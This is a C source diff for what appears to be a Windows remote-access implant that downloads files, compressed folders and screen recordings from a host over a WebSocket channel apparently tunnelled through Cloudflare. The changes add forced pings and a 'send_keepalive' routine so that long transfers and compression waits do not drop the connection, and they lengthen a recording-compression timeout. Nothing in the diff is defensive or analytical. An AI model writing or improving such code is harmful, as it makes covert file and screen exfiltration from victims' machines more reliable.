@@ -735,6 +735,28 @@ void send_websocket_ping() {
     g_last_ping_time = current_time;
 }
 
+// Force ping - bypasses rate limit, use during long operations
+void send_websocket_ping_force() {
+    if (!g_connected || g_sock == INVALID_SOCKET) return;
+    
+    unsigned char ping_frame[6];
+    ping_frame[0] = 0x89;
+    ping_frame[1] = 0x80;
+    
+    for (int i = 0; i < 4; i++) {
+        ping_frame[2 + i] = rand() % 256;
+    }
+    
+    send(g_sock, (char*)ping_frame, 6, 0);
+    g_last_ping_time = GetTickCount();
+}
+
+// Send a keepalive message - actual data to keep Cloudflare connection alive
+void send_keepalive() {
+    if (!g_connected || g_sock == INVALID_SOCKET) return;
+    send_websocket_data("[*] ...\r", 8);  // Carriage return overwrites on same line
+}
+
 int parse_websocket_frame(unsigned char* data, int len, char* output, int* output_len) {
     if (len < 2) return 0;
     
@@ -1510,7 +1532,7 @@ int download_file(const char* filename) {
         // Send ping every 5 seconds to keep connection alive during large transfers
         DWORD now = GetTickCount();
         if (now - last_ping > 5000) {
-            send_websocket_ping();
+            send_websocket_ping_force();
             last_ping = now;
         }
         
@@ -1808,11 +1830,11 @@ void download_folder(const char* foldername) {
         DWORD last_ping = GetTickCount();
         int dots = 0;
         
-        while ((wait_result = WaitForSingleObject(pi.hProcess, 3000)) == WAIT_TIMEOUT) {
-            // Send ping every 3 seconds during compression
-            send_websocket_ping();
+        while ((wait_result = WaitForSingleObject(pi.hProcess, 2000)) == WAIT_TIMEOUT) {
+            // Send keepalive every 2 seconds during compression
+            send_keepalive();
             dots++;
-            if (dots % 10 == 0) {
+            if (dots % 5 == 0) {
                 send_websocket_data("[*] Still compressing...\n", 25);
             }
             
@@ -3574,14 +3596,15 @@ void download_screenrecord() {
             // Wait for recording thread with periodic pings to keep connection alive
             DWORD wait_result;
             int wait_count = 0;
-            while ((wait_result = WaitForSingleObject(g_screenrecord_thread, 3000)) == WAIT_TIMEOUT) {
-                send_websocket_ping();
+            while ((wait_result = WaitForSingleObject(g_screenrecord_thread, 2000)) == WAIT_TIMEOUT) {
+                // Send keepalive data every 2 seconds to prevent Cloudflare timeout
+                send_keepalive();
                 wait_count++;
-                if (wait_count % 10 == 0) {
+                if (wait_count % 5 == 0) {
                     send_websocket_data("[*] Still compressing video...\n", 31);
                 }
                 // Timeout after 5 minutes
-                if (wait_count > 100) {
+                if (wait_count > 150) {
                     send_websocket_data("[!] Compression timed out\n", 26);
                     TerminateThread(g_screenrecord_thread, 0);
                     break;
@@ -3675,14 +3698,14 @@ void download_screenrecord() {
             send_websocket_data(msg, strlen(msg));
         }
         
-        // Send ping before each file to ensure connection is alive
-        send_websocket_ping();
+        // Send keepalive before each file to ensure connection is alive
+        send_keepalive();
         Sleep(100);
         
         if (download_file(files[i])) {
             success_count++;
-            // Ping after successful download
-            send_websocket_ping();
+            // Keepalive after successful download
+            send_keepalive();
         } else {
             fail_count++;
             char* filename = strrchr(files[i], '\\');
